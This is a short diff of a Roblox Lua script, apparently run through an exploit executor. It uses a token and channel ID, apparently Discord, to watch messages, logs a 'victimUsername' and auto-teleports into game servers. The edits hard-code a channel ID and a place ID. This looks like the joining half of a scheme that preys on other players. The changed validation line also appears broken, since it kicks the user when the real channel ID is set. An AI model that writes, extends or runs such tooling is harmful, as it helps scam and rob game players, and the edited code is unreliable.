@@ -2,7 +2,7 @@ if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
 
-if token == "" or channelId == "" then
+if token == "" or channelId == "1397780126145450114" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
@@ -137,7 +137,7 @@ local function autoJoin()
                             if not table.find(joinedIds, tostring(message.id)) then
                                 saveJoinedId(tostring(message.id))
                                 writefile("user.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, jobId)
                                 return
                             end
                         end
